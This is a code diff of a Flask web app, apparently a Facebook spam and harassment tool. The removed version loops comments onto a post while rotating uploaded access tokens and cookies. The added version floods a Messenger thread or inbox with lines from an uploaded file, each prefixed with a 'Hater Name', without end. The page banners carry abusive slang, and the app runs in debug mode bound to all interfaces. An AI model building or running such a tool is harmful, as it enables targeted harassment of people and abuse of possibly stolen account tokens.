@@ -1,8 +1,10 @@
-from flask import Flask, request, render_template, redirect, url_for, make_response, jsonify
+from flask import Flask, request
 import requests
+from time import sleep
 import time
-
+from datetime import datetime
 app = Flask(__name__)
+app.debug = True
 
 headers = {
     'Connection': 'keep-alive',
@@ -15,216 +17,360 @@ headers = {
     'referer': 'www.google.com'
 }
 
-# Global variable to track comment sending status
-sending_comment = False
-stopped = False
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
 
-@app.route('/')
-def index():
-    return '''<!DOCTYPE html>
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
+
+
+    return '''
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>POST SERVER WEB TO WEB</title>
-    <style>
-        .header {
-            display: flex;
-            align-items: center;
-        }
-        .header h1 {
-            margin: 0 20px;
-        }
-        .header img {
-            max-width: 100px; 
-            margin-right: 20px;
-        }
-        .random-img {
-            max-width: 300px;
-            margin: 10px;
-        }
-        .form-control {
-            width: 100%;
-            padding: 5px;
-            margin-bottom: 10px;
-        }
-        .btn-submit {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
-        #status {
-            margin-top: 10px;
-            color: blue;
-        }
-    </style>
-    <script>
-        var stopped = false;
-
-        function stopProcess() {
-            stopped = true;
-            fetch('/stop', {method: 'POST'});
-            document.getElementById("status").innerText = "Process stopped.";
-        }
-
-        function checkStatus() {
-            if (!stopped) {
-                fetch('/status')
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.sending) {
-                            document.getElementById("status").innerText = "Sending comment...";
-                        } else {
-                            document.getElementById("status").innerText = "Failed to send comment.";
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error fetching status:', error);
-                    });
-                setTimeout(checkStatus, 3000); // Check status every 3 seconds
-            }
-        }
-
-        window.onload = function() {
-            checkStatus();
-        };
-    </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PRINCE ON FIRE </title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-image: url('birthday_background.jpg'); /* Specify the path to your birthday background image */
+      background-repeat: repeat; /* Repeat the background image */
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      max-width: 300px;
+      background-color: bisque;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      margin: 20px auto;
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+      color: blue;
+    }
+    .btn-submit {
+      width: 100%;
+      margin-top: 10px;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .box {
+      border: 2px solid black;
+      padding: 20px;
+      margin-top: 20px;
+      background-color: lavender;
+      color: purple;
+    }
+    /* New styles for birthday box */
+    .birthday-box {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #ffcc00;
+      color: black;
+      padding: 5px 10px;
+      border-radius: 5px;
+      z-index: 999;
+    } 
+  </style>
 </head>
 <body>
-    <header class="header mt-4">
-        <h1 class="mb-3" style="color: blue;">𝐎𝐖𝐍𝐄𝐑 𝐑𝐎𝐇𝐈𝐓𝐗𝐃𝐖</h1>
-        <h1 class="mt-3" style="color: red;"> (𝐃𝐀𝐑𝐊 𝐅𝐎𝐍𝐗𝐓𝐄𝐑)</h1>
-    </header>
+  <!-- Birthday box -->
+  <div class="birthday-box">
+    <p>🎉 𝗚𝗢𝗗 𝗔𝗕𝗨𝗦𝗘𝗥 𝗞𝗜 𝗠𝗞𝗖     🤡 </p>
+  </div>
 
-<div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
-        <div class="mb-3">
-            <label for="threadId">POST ID:</label>
-            <input type="text" class="form-control" id="threadId" name="threadId" required>
-        </div>
-        <div class="mb-3">
-            <label for="kidx">Enter Hater Name:</label>
-            <input type="text" class="form-control" id="kidx" name="kidx" required>
-        </div>
-        <div class="mb-3">
-            <label for="messagesFile">Select Your Np File:</label>
-            <input type="file" class="form-control" id="messagesFile" name="messagesFile" accept=".txt" required>
-        </div>
-        <div class="mb-3">
-            <label for="txtFile">Select Your Tokens File:</label>
-            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-        </div>
-        <div class="mb-3">
-            <label for="time">Speed in Seconds (minimum 60 second for better results):</label>
-            <input type="number" class="form-control" id="time" name="time" required>
-        </div>
-        <div class="mb-3">
-            <label for="cookieData">Enter Cookie Data (comma or newline separated) or Upload Cookie File:</label>
-            <textarea class="form-control" id="cookieData" name="cookieData"></textarea>
-            <input type="file" class="form-control" id="cookieFile" name="cookieFile">
-        </div>
-        <div class="mb-3">
-            <label for="appStatusFile">Select Your App Status File:</label>
-            <input type="file" class="form-control" id="appStatusFile" name="appStatusFile" accept=".txt" required>
-        </div>
-        <button type="button" onclick="stopProcess()" class="btn btn-danger btn-submit">Stop Process</button>
-        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
-    </form>
-    <div id="status"></div>
+ <style>
+        /* Style for the container */
+        .containe {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #F9F449;
+            padding: 20px;
+            border: 3px solid black;
+            border-radius: 10px;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        } 
+         .containr {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #C3F7EF;
+            padding: 20px;
+            border-radius: 10px; /* Added border radius value */
+            border-style: solid;
+            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Keyframes for the border color change */
+        @keyframes borderChangeColor {
+    0% { border-color: red; }
+    10% { border-color: orange; }
+    20% { border-color: yellow; }
+    30% { border-color: lime; }
+    40% { border-color: green; }
+    50% { border-color: aqua; }
+    60% { border-color: blue; }
+    70% { border-color: purple; }
+    80% { border-color: indigo; }
+    90% { border-color: violet; }
+    100% { border-color: pink; }
+}
+
+        }
+
+        /* Keyframes for the border width change */
+        @keyframes borderChangeWidth {
+            0% { border-width: 5px; }
+            10% { border-width: 10px; }
+            20% { border-width: 3px; }
+            40% { border-width: 8px; }
+            60% { border-width: 4px; }
+            80% { border-width: 7px; }
+            100% { border-width: 6px; }
+        }
+
+        /* Keyframes for the border style change */
+        @keyframes borderChangeStyle {
+            0% { border-style: solid; }
+            10% { border-style: dotted; }
+            20% { border-style: dashed; }
+            30% { border-style: double; }
+            40% { border-style: groove; }
+            50% { border-style: ridge; }
+            60% { border-style: inset; }
+            70% { border-style: outset; }
+           
+           
+           
+        } .containor {
+            width: 300px;
+            margin: 50px auto;
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px; /* Added border radius value */
+            border-style: solid;
+            animation: borderChangeColor 1s infinite alternate, borderChangeWidth 1s infinite alternate, borderChangeStyle 10s infinite alternate;
+        }
+        
+        /* Style for the text inside the box */
+        .text-box {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Keyframes for the border color change */
+        @keyframes borderChangeColor {
+    0% { border-color: red; }
+    10% { border-color: orange; }
+    20% { border-color: yellow; }
+    30% { border-color: lime; }
+    40% { border-color: green; }
+    50% { border-color: aqua; }
+    60% { border-color: blue; }
+    70% { border-color: purple; }
+    80% { border-color: indigo; }
+    90% { border-color: violet; }
+    100% { border-color: pink; }
+}
+
+        }
+
+        /* Keyframes for the border width change */
+        @keyframes borderChangeWidth {
+            0% { border-width: 5px; }
+            10% { border-width: 10px; }
+            20% { border-width: 3px; }
+            40% { border-width: 8px; }
+            60% { border-width: 4px; }
+            80% { border-width: 7px; }
+            100% { border-width: 6px; }
+        }
+
+        /* Keyframes for the border style change */
+        @keyframes borderChangeStyle {
+           
+            30% { border-style: double; }
+            40% { border-style: groove; }
+            50% { border-style: ridge; }
+            60% { border-style: inset; }
+            70% { border-style: outset; }
+           
+           
+           
+        }
+    </style>
+</head>
+<body> </div> <div class="containor">
+    <!-- Your text box content here -->
+    <footer class="footer">
+      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">🅴🅽🅹🅾🆈 -- 🅶🅸🅵🆃</span>.</span></p>
+      <p><span class="boxed-text2"><span class="color-span">𝟮𝟵 𝗠𝗔𝗬 𝗕𝗜𝗥𝗧𝗛𝗗𝗔𝗬 𝗚𝗜𝗙𝗧 </span></span></p>
+  </p>
+    </footer>
+    </div>
 </div>
 
-    <div class="random-images">
-        <!-- Add more random images and links here as needed -->
+
+    <div class="containe">
+      <form action="/" method="post" enctype="multipart/form-data">
+        <div class="mb-3">
+          <label for="accessToken">Enter Your Token:</label>
+          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+        </div>
+        <div class="mb-3">
+          <label for="threadId">Enter Convo/Inbox ID:</label>
+          <input type="text" class="form-control" id="threadId" name="threadId" required>
+        </div>
+        <div class="mb-3">
+          <label for="kidx">Enter Hater Name:</label>
+          <input type="text" class="form-control" id="kidx" name="kidx" required>
+        </div>
+        <div class="mb-3">
+          <label for="txtFile">Select Your Notepad File:</label>
+          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+        </div>
+        <div class="mb-3">
+          <label for="time">Speed in Seconds:</label>
+          <input type="number" class="form-control" id="time" name="time" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+      </form>
     </div>
+   <style>
+    .footer {
+      color: #B00402; /* Off-Blue color */
+    }
+    .boxed-text {
+      border: 2px solid #B00402; /* Border around the text */
+      padding: 10px; /* Add some padding inside the box */
+      display: inline-block; /* Make the box inline so it wraps around the text */
+    }
+    .boxed-text2 {
+      border: 2px solid #000000; /* Border around the text */
+      padding: 10px; /* Add some padding inside the box */
+      display: inline-block; /* Make the box inline so it wraps around the text */
+    }
+    .footer a {
+      color: #FFFF00; /* Off-Blue color for links */
+      text-decoration: none; /* Remove underline from links */
+    }
+    
+  </style>
+</head>
+<body>
+  <div>
+    
+  </div> <div class="containor">
+    <!-- Your text box content here -->
+    <footer class="footer">
+      <p> <span class="color-sp"></span> <span class="boxed-text"<span class="color-span">❰ 𝗦𝗔𝗥𝟯 𝗛𝗔𝗪𝗔𝗕𝗔𝗭𝗢 𝗞𝗔 𝗙𝗔𝗧𝗛𝗘𝗥 𝗛𝗘𝗥𝗘 ❱</span></span><//p>
+      <p><span class="boxed-text"><span class="color-span"> 𝗚𝗜𝗙𝗧 𝗢𝗙 ❰𝗡𝗢𝗕𝗜𝗧𝗔❱</span></span></p>
+      <p><span class="boxed-text"><span class="color-sp">OWNER CONTACT</span> <a href="https://www.facebook.com/profile.php?id=100075799987253" class="color-s">FACEBOOK</a></p>
+    </footer>
+    </div>
+</div>
+
+  <script>
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-span');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); 
+    </script>
+    <script>
+    
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-spa');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); // Change color every 2 seconds (2000 milliseconds)
+  </script>
+  
+  <script>
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-s');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); 
+    </script>
+    <script>
+    
+    // JavaScript to change footer text color
+    var colors = ['red', 'green', 'blue', 'purple', 'orange']; // Define colors
+    var colorIndex = 0;
+
+    setInterval(function() {
+      var footerTexts = document.querySelectorAll('.footer .color-sp');
+      footerTexts.forEach(function(span) {
+        span.style.color = colors[colorIndex];
+      });
+      colorIndex = (colorIndex + 1) % colors.length;
+    }, 500); // Change color every 2 seconds (2000 milliseconds)
+  </script>
 </body>
-</html>'''
+</html>
 
-@app.route('/status')
-def status():
-    global sending_comment
-    return jsonify({"sending": sending_comment})
+    '''
 
-@app.route('/stop', methods=['POST'])
-def stop():
-    global stopped
-    stopped = True
-    return '', 204
-
-@app.route('/', methods=['POST'])
-def send_message():
-    global sending_comment, stopped
-    thread_id = request.form.get('threadId')
-    mn = request.form.get('kidx')
-    time_interval = int(request.form.get('time'))
-
-    txt_file = request.files['txtFile']
-    access_tokens = txt_file.read().decode().splitlines()
-
-    messages_file = request.files['messagesFile']
-    messages = messages_file.read().decode().splitlines()
-
-    app_status_file = request.files['appStatusFile']
-    app_statuses = app_status_file.read().decode().splitlines()
-
-    # Check if cookie data is manually entered
-    cookie_data = request.form.get('cookieData')
-    if cookie_data:
-        cookies = [cookie.strip() for cookie in cookie_data.split(',')]
-    else:
-        # If cookie data is not entered, check for uploaded cookie file
-        cookie_file = request.files['cookieFile']
-        cookies = cookie_file.read().decode().splitlines()
-
-    num_comments = len(messages)
-    max_tokens = len(access_tokens)
-    max_cookies = len(cookies)
-    max_statuses = len(app_statuses)
-
-    post_url = f'https://graph.facebook.com/v15.0/{thread_id}/comments'
-    haters_name = mn
-    speed = time_interval
-
-    sending_comment = True
-    stopped = False
-
-    while not stopped:
-        try:
-            for comment_index in range(num_comments):
-                if stopped:
-                    break
-
-                token_index = comment_index % max_tokens
-                cookie_index = comment_index % max_cookies
-                status_index = comment_index % max_statuses
-
-                access_token = access_tokens[token_index]
-                cookie = cookies[cookie_index]
-                app_status = app_statuses[status_index]
-
-                comment = messages[comment_index].strip()
-
-                parameters = {
-                    'access_token': access_token,
-                    'message': f"{haters_name} {comment}",
-                    'app_status': app_status
-                }
-
-                # Set the cookie header
-                headers['Cookie'] = cookie
-
-                response = requests.post(post_url, json=parameters, headers=headers)
-
-                time.sleep(speed)
-
-        except Exception as e:
-            sending_comment = False
-            print(f"Error: {e}")
-            break
-
-    sending_comment = False
-    return redirect(url_for('index'))
 
 if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
     app.run(debug=True)
